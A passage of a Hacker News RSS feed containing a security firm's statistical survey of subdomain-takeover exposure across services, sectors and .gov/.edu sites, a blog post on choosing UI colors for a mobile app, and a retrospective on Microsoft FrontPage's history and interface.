https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=1536%2C1399&amp;ssl=1 1536w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=2048%2C1865&amp;ssl=1 2048w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=1200%2C1093&amp;ssl=1 1200w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?w=1280&amp;ssl=1 1280w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?w=1920&amp;ssl=1 1920w" data-lazy-src="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/tool-logic.png?resize=640%2C582&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Architectural Logic of the Tool</figcaption></figure></div>



<p>The entire setup consisted of mainly 3 components:</p>



<ul><li><strong>DNS Resolving</strong>: This component was mainly entitled to the task of mass resolving domains to their CNAME records by making DNS queries. It took input from the input-queue consisting of domains/subdomains and generated an output compatible with the HTTP component.</li><li><strong>HTTP Response Grabbing</strong>: The output from the DNS resolving entity was fed into this element, which did with the task of making mass HTTP queries to the domains and look for potential takeovers.</li><li><strong>Filtering &amp; Analysis</strong>: This component took the load of filtering out false positives from the results obtained through several layers before flagging a domain as vulnerable. This constituent also performed an analysis of the data obtained.</li></ul>



<p>The system was designed to intelligently detect possible takeovers while handling all kinds of exceptions and keeping in mind other complications of the HTTP protocol. The tool was also suited to follow the pattern of the database which was created. The flowchart below defines the overall logic around which the tool functioned:</p>



<h3>Results</h3>



<div><figure><img data-attachment-id="4545" data-permalink="https://redhuntlabs.com/blog/project-resonance-wave-1.html/image-3-3" data-orig-file="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?fit=1485%2C954&amp;ssl=1" data-orig-size="1485,954" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-3" data-image-description="" data-medium-file="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?fit=300%2C193&amp;ssl=1" data-large-file="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?fit=640%2C411&amp;ssl=1" loading="lazy" width="640" height="411" src="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=640%2C411&amp;ssl=1" alt="" srcset="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=1024%2C658&amp;ssl=1 1024w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=300%2C193&amp;ssl=1 300w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=768%2C493&amp;ssl=1 768w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=1200%2C771&amp;ssl=1 1200w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?w=1485&amp;ssl=1 1485w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?w=1280&amp;ssl=1 1280w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=1024%2C658&amp;ssl=1 1024w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=300%2C193&amp;ssl=1 300w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=768%2C493&amp;ssl=1 768w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=1200%2C771&amp;ssl=1 1200w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?w=1485&amp;ssl=1 1485w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?w=1280&amp;ssl=1 1280w" data-lazy-src="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png?resize=640%2C411&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>Taking a deep dive at the statistics generated by our research, surprised us by the massive numbers. The first thing that came to our notice was the fact a total of 33 services that (unintentionally) allowed for potential subdomain takeovers, were identified. Interestingly, a large percent (62%) of vulnerable DNS records pointed to Shopify. This also indicates that most of the vulnerable domains belonged to the E-commerce industry, signifying that e-commerce still remains largely affected by security issues.&nbsp;</p>



<div><figure><img data-attachment-id="4536" data-permalink="https://redhuntlabs.com/blog/project-resonance-wave-1.html/vulnerable-services-2" data-orig-file="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?fit=1024%2C768&amp;ssl=1" data-orig-size="1024,768" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vulnerable-services-2" data-image-description="" data-medium-file="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?fit=640%2C480&amp;ssl=1" loading="lazy" width="640" height="480" src="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=640%2C480&amp;ssl=1" alt="" srcset="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?w=1024&amp;ssl=1 1024w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=800%2C600&amp;ssl=1 800w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=400%2C300&amp;ssl=1 400w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=200%2C150&amp;ssl=1 200w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?w=1024&amp;ssl=1 1024w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=800%2C600&amp;ssl=1 800w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=400%2C300&amp;ssl=1 400w, https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=200%2C150&amp;ssl=1 200w" data-lazy-src="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-services-2.png?resize=640%2C480&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Top 5 vulnerable services</figcaption></figure></div>



<p>In the other half of results, Unbounce (landing pages creator) ranked second highest in the vulnerable share consuming about 14% of vulnerable domains, followed by Heroku (9%), GitHub Pages (4%), Bigcartel (2%), Tumblr (1%), Webflow (1%) and Pantheon (1%). The remainder 20% of the shares consisted mostly of WordPress, Surge.sh, AWS, etc, with HelpJuice comprising the least of the shares (just 15 takeovers).</p>



<p>Diving deeper into the results obtained, our first and foremost observation was that amongst Alexa Top 1000 domains, we identified 139 possible takeovers. </p>



<figure><blockquote><p>Overall, we identified a total of 424,120 subdomains had misconfigured CNAME records, and were prone to take over across the internet. It simply means that organizations still have a huge number of assets (subdomains, in this case) which are untracked and hence potentially vulnerable to subdomain takeover. </p></blockquote></figure>



<div><figure><img data-attachment-id="4537" data-permalink="https://redhuntlabs.com/blog/project-resonance-wave-1.html/vulnerable-keywords-2" data-orig-file="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?fit=1024%2C768&amp;ssl=1" data-orig-size="1024,768" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vulnerable-keywords-2" data-image-description="" data-medium-file="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?fit=640%2C480&amp;ssl=1" loading="lazy" width="640" height="480" src="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=640%2C480&amp;ssl=1" alt="" srcset="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?w=1024&amp;ssl=1 1024w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=300%2C225&amp;ssl=1 300w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=768%2C576&amp;ssl=1 768w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=800%2C600&amp;ssl=1 800w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=400%2C300&amp;ssl=1 400w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=200%2C150&amp;ssl=1 200w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?w=1024&amp;ssl=1 1024w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=300%2C225&amp;ssl=1 300w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=768%2C576&amp;ssl=1 768w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=800%2C600&amp;ssl=1 800w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=400%2C300&amp;ssl=1 400w, https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=200%2C150&amp;ssl=1 200w" data-lazy-src="https://i2.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-keywords-2.png?resize=640%2C480&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Top 10 vulnerable subdomain names</figcaption></figure></div>



<p>A very significant pattern which we observed was that interestingly the most common vulnerable subdomain was&nbsp; <em>”www”</em>, which means most of the stale records pointed to the “home subdomain” of the sites. The next popular subdomain name was <em>“shop”</em>, followed by <em>“store”</em> and <em>“blog”</em>.</p>



<figure><blockquote><p>Since Chrome 69, Google has decided to strip the “www” and “m” subdomains from the URL displayed in the browser’s address bar. So if such a subdomain get compromised, for a normal user, it becomes quite difficult to figure out that it might be browsing attacker-controlled content.</p></blockquote></figure>







<p>Analyzing all the domains within our database, we also found ~200 non-functional <em>.gov</em> site subdomains prone to takeover. An extremely mind-boggling observation here was that one of the domains had implemented a wildcard CNAME record, and the service to which it was pointing was non-existent (i.e. claimable). <em>The security impact of such a case is beyond comprehension because a wildcard CNAME entry implies that *.site.tld will resolve, signifying that once the service has been taken over, not only the existing ones but non-existent subdomains of the site will also resolve to the attacker-controlled service.</em></p>



<p>We also observed that several (around ~1K) subdomains were <em>.edu</em> sites that were vulnerable to takeover. Unbounce and Pantheon were among the top popular vulnerable services within the <em>.edu</em> domains. The results included subdomains from a lot of prestigious universities. This also sheds some light on the kind of infrastructure that some of the top educational sites use.&nbsp;</p>



<div><figure><img data-attachment-id="4538" data-permalink="https://redhuntlabs.com/blog/project-resonance-wave-1.html/vulnerable-indistries-1" data-orig-file="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?fit=1024%2C768&amp;ssl=1" data-orig-size="1024,768" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vulnerable-indistries-1" data-image-description="" data-medium-file="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?fit=640%2C480&amp;ssl=1" loading="lazy" width="640" height="480" src="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=640%2C480&amp;ssl=1" alt="" srcset="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=300%2C225&amp;ssl=1 300w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=768%2C576&amp;ssl=1 768w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=800%2C600&amp;ssl=1 800w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=400%2C300&amp;ssl=1 400w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=200%2C150&amp;ssl=1 200w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=300%2C225&amp;ssl=1 300w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=768%2C576&amp;ssl=1 768w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=800%2C600&amp;ssl=1 800w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=400%2C300&amp;ssl=1 400w, https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=200%2C150&amp;ssl=1 200w" data-lazy-src="https://i1.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/vulnerable-indistries-1.png?resize=640%2C480&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Representation of takeovers by specific industries</figcaption></figure></div>



<p>On the other hand, healthcare, wellness, and fitness sites too consumed a significant share of the vulnerable subdomains (around ~5K). In this case, Unbounce and Strikingly took the top places in vulnerable services. A worth noting point in this section is the diverse set of results that had been harvested, which ranged from sellers of pharmaceutical items to online consultancy services, from fitness centers to healthcare gear distributors, denoting that all of them were significantly affected by security issues.&nbsp;</p>



<p>The sports and gaming section too had around ~4K takeovers while the entertainment sector consumed a minor share (around 500). Similar to the health sector, this too affected a wide range of offerings, from several video game retailers to sport-specific training providers. The list is long and we can continue reading from our insights but we just decided to focus on the major ones for now.</p>



<h3>Implications of a takeover.</h3>



<p>Following an attacker’s perspective, such takeovers can be abused in several ways:</p>



<ul><li>Since a subdomain represents a part of the organization, a subdomain takeover can allow an attacker to serve malicious content or misguiding information and thus cause Brand Reputation loss, User Distrust and Negative PR.</li><li>It has <strong><a href="https://whitehatnepal.tumblr.com/post/149985438982/how-i-was-able-to-read-uber-logs-and-internal" target="_blank" rel="noreferrer noopener">previously come to light</a></strong> that internal emails can be actively intercepted just by claiming a simple webhook of the third-party service (e.g. <em>Sendgrid</em>) which an application might be using for email marketing.&nbsp;</li><li>OAuth whitelisting of a vulnerable subdomain might be a cause of trouble, because an attacker can …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://redhuntlabs.com/blog/project-resonance-wave-1.html">https://redhuntlabs.com/blog/project-resonance-wave-1.html</a></em></p>]]>
            </description>
            <link>https://redhuntlabs.com/blog/project-resonance-wave-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25135317</guid>
            <pubDate>Wed, 18 Nov 2020 10:48:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UI design for software developers. Part 1, Colors]]>
            </title>
            <description>
<![CDATA[
Score 226 | Comments 90 (<a href="https://news.ycombinator.com/item?id=25135215">thread link</a>) | @Igor_Wiwi
<br/>
November 18, 2020 | http://amortizedcost.net/ui-desing-for-software-developer-part-1/ | <a href="https://web.archive.org/web/*/http://amortizedcost.net/ui-desing-for-software-developer-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<!--kg-card-begin: markdown--><p>In this series of articles, I will show full process of creating a UI design for <a href="https://play.google.com/store/apps/details?id=net.amortizedcost.batchimageshrinker">Batch Image Shrinker</a> (<a href="market://details?id=net.amortizedcost.batchimageshrinker">Google play link</a>) mobile application which I did by myself. As a software developer always I've been thinking that UI design is not for me, that it's complex and requires some art skill or something.</p>
<p>It's a myth and I will try to debunk it.</p>
<p>I will show you that UI design is for everyone, you just need to know some basic technics and a couple of tricks.</p>
<p>It's not going to be easy, but I promise you it will be very interesting.</p>
<h2 id="dominatingcolor">Dominating color</h2>
<p>With the dominating presence of dark-mode, I noticed that for me it was easier to work with darker colors as baseline colors than with brighter ones, and since  I almost always use dark-mode of the applications, so I wanted to have something similar in my application. I was certain that I didn't want to use <a href="https://colornames.org/color/3b5998">Facebook blue</a> color and it's successors, so I had to find something more futuristic and brave than that. My choice fell on <code>#464d77</code> which is a very intense dark blue, almost purple color.</p>
<p><img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-17-at-20.10.09.png" alt="Screenshot-2020-11-17-at-20.10.09"></p>
<p>Common advice here will be not to use pure black or white colors, which, as perfectly described in <a href="https://ianstormtaylor.com/design-tip-never-use-black/">the article</a>, hardly present in the real-world color pallet. <em>What a coincidence, I found <a href="https://lawsofux.com/aesthetic-usability-effect.html">a website</a> with a perfect example of dark background color and great content to read.</em></p>
<h2 id="colorpalette">Color palette</h2>
<p>Of cause, just one baseline color will not be enough to build a feature-rich application. You will need a couple of colors for different types of components like buttons, checkboxes, radio buttons, etc. Another one or two colors will be needed for the text itself. Also,  some gradients for several states of a component, such as "active", "disabled", "pressed". So before creating an actual UI, we will need to have a rich pallet of colors to work with. In my case, I ended up with 6 colors in total which was more than enough to create a simple yet interesting UI.</p>
<p>This step is much easier than the previous one, because here we will be either reusing or generating new color pallets using the baseline color from the previous part.</p>
<p>The generator which I was using is <a href="https://coolors.co/palettes/popular/f9db6d">this</a>. Here you could either put the color hex into a search bar or simply choose the pallet from the <a href="https://coolors.co/a1e8af-94c595-747c92-372772-3a2449">hundreds</a> of pre-generated ones. If the color range is not enough for you, try to extend it with <a href="https://learnui.design/tools/data-color-picker.html#palette">another</a> good palette generator. Put on the left side the baseline color and select how many colors you will need.</p>
<p>Pro-tip, you can combine those tools to get even more combinations. As you can see here, I was using a baseline color on the right side and colors from <a href="https://coolors.co/464d77-36827f-f9db6d-f4eded-877666">the palette</a> as values for the right side of the generator:</p>
<p><img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-16-at-23.50.31.png" alt="Screenshot-2020-11-16-at-23.50.31"><br>
<img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-16-at-23.51.04.png" alt="Screenshot-2020-11-16-at-23.51.04"></p>
<p>If you are not satisfied with the results try to get back to choosing the baseline color and repeat the whole process again. Since we are learning it's ok to do multiple roundtrips until your gut feelings tell you that that is it.</p>
<p>Once we are done with the color schema we are good to go to we move to the next step - choosing fonts, which will be covered next time.</p>
<!--kg-card-end: markdown-->
			</section><section>
				<p>Get the latest posts delivered right to your inbox.</p>
        


      </section></div>]]>
            </description>
            <link>http://amortizedcost.net/ui-desing-for-software-developer-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25135215</guid>
            <pubDate>Wed, 18 Nov 2020 10:33:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Frontpage: The Good, Bad and Ugly]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25135058">thread link</a>) | @jandeboevrie
<br/>
November 18, 2020 | https://invisibleup.com//articles/33/ | <a href="https://web.archive.org/web/*/https://invisibleup.com//articles/33/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	
	
	<img src="https://invisibleup.com/articles/33/thumb.png" alt="FrontPage: The Good, The Bad, and The Ugly thumbnail">
	
	

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
